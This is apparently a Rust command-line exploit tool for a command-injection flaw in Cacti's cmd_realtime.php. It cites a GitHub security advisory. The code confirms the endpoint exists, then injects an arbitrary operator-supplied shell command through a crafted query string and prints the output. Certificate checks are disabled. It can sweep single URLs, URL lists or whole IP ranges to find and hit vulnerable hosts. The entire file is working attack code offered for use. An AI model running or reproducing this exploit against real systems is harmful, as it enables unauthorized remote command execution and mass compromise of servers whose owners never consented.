use reqwest::blocking::Client;
use reqwest::Url;
use std::env;
use std::fs::File;
use std::io::{self, BufRead};
use std::path::Path;
use std::process;
use ipnetwork::IpNetwork;
use std::str::FromStr;
use std::time::Duration;

struct CactiValidator {
    client: Client,
}

impl CactiValidator {
    fn new() -> Self {
        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(2)) // timeout area
            .build()
            .unwrap();
        CactiValidator { client }
    }
    //check
    fn validate(&self, url: &str) -> bool {
        let endpoint = "/cacti/cmd_realtime.php";
        let full_url = format!("{}{}", url, endpoint);
        match self.client.get(&full_url).send() {
            Ok(response_from_url) => {
                if response_from_url.status().is_success() {
                    println!("Found Cacti at {}", url);
                    return true;
                }
            }
            Err(e) => {
                eprintln!("Error: {}", e);
            }
        }
        false
    }
}

struct RemoteCommandExecutor {
    client: Client,
}

impl RemoteCommandExecutor {
    fn new() -> Self {
        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(2)) // Timeout set to 2 seconds, you can change this duration if you wish.
            .build()
            .unwrap();
        RemoteCommandExecutor { client }
    }
    //code execution area*
    fn execute(&self, url: &str, command: &str) {
        let parsed_url = Url::parse(url).unwrap();
        let stripped_url = format!("{}://{}", parsed_url.scheme(), parsed_url.host_str().unwrap());
        let payload_cac = format!("{}/cacti/cmd_realtime.php?1+1&&{}+1+1+1", stripped_url, command); //You can reach the reference url: https://github.com/Cacti/cacti/security/advisories/GHSA-cr28-x256-xf5m

        println!("URL: {}", payload_cac);
        match self.client.get(&payload_cac).send() {
            Ok(response) => {
                let formatted = response.text().unwrap().replace("<br>", "\n").replace("<strong>", "").replace("</strong>", "");
                println!("{}", formatted);
            }
            Err(e) => {
                eprintln!("Error: {}", e);
            }
        }
    }
}
//file read area
fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
where
    P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}
//usage area
fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        println!("Usage: app -m http://site.com/ -c whoami");
        println!("Or: app -w url_list.txt -c whoami");
        println!("Or: app -r 192.168.1.0/24 -c whoami");
        process::exit(1);
    }

    let mut url = String::new();
    let mut command = String::new();
    let mut url_list = Vec::new();
    let mut ip_range = String::new();

    //as u know args
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-m" => {
                if i + 1 < args.len() {
                    url = args[i + 1].clone();
                    i += 1;
                } else {
                    println!("Error: Missing URL after -m");
                    process::exit(1);
                }
            }
            "-c" => {
                if i + 1 < args.len() {
                    command = args[i + 1].clone();
                    i += 1;
                } else {
                    println!("Error: Missing command after -c");
                    process::exit(1);
                }
            }
            "-w" => {
                if i + 1 < args.len() {
                    let filename = &args[i + 1];
                    if let Ok(lines) = read_lines(filename) {
                        for line in lines {
                            if let Ok(url) = line {
                                url_list.push(url);
                            }
                        }
                    } else {
                        println!("Error: Could not read file {}", filename);
                        process::exit(1);
                    }
                    i += 1;
                } else {
                    println!("Error: Missing filename after -w");
                    process::exit(1);
                }
            }
            "-r" => {
                if i + 1 < args.len() {
                    ip_range = args[i + 1].clone();
                    i += 1;
                } else {
                    println!("Error: Missing IP range after -r");
                    process::exit(1);
                }
            }
            _ => {
                println!("Error: Unknown argument {}", args[i]);
                process::exit(1);
            }
        }
        i += 1;
    }

    if url_list.is_empty() && url.is_empty() && ip_range.is_empty() {
        println!("Error: No URL or IP range provided");
        process::exit(1);
    }

    let validator = CactiValidator::new();
    let executor = RemoteCommandExecutor::new();

    if !url_list.is_empty() {
        for url in url_list {
            if validator.validate(&url) {
                executor.execute(&url, &command);
            }
        }
    } else if !url.is_empty() {
        if validator.validate(&url) {
            executor.execute(&url, &command);
        }
        //ip range scan area
    } else if !ip_range.is_empty() {
        let network = IpNetwork::from_str(&ip_range).expect("Invalid IP range");
        for ip in network.iter() {
            println!("Scanning IP: {}", ip);
            let url = format!("http://{}", ip);
            if validator.validate(&url) {
                executor.execute(&url, &command);
            }
        }
    }
}
